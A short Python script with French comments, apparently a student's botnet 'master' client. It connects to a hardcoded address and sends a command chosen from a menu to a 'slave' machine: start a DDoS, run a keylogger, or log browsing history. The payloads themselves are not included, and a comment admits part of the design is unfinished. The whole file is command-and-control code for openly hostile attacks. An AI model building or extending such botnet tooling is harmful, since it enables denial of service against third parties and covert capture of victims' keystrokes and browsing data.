#IL S'AGIT DU CLIENT !!!!

#modules
import socket
import argparse

#fonction pour choisir l'atttaque
def choix_attaque():
    select = int(input("1) DDos \n2)Keylogger \n3)Logger historique \nSélectionnez une option : "))
    while (select<1) or (select>3):
        print("Erreur, faites un choix entre 1 et 3")
        select = int(input("1) DDos \n2)Keylogger \n3)Logger historique \nSélectionnez une option : "))
    if select == 1:
        print("Choix d'attaque : DDoS. Signal envoyé")
        s.sendall(b"ddos")
    elif select == 2:
        print("Choix d'attaque : Keylogger. Signal envoyé")
        s.sendall(b"keylogger")
    elif select == 3:
        print("Choix d'attaque : Logger historique. Signal envoyé")
        s.sendall(b"historique")

#on définit les coordonnées sur lesquelles le maître va envoyer ses
#instructions
server_addr = ("192.168.56.1", 60000)

#création du socket
s = socket.socket(socket .AF_INET, socket .SOCK_STREAM)

#on connecte le maître à ce serveur
s.connect(server_addr)

#récupération de l'adresse de l'esclave, sauf que je ne sais pas endore comment faire
#liste_adresses = []
#liste_adresses.append(s.recv(1024))
#print(liste_adresses)

#envoie de l'attaque à l'esclave
choix_attaque()


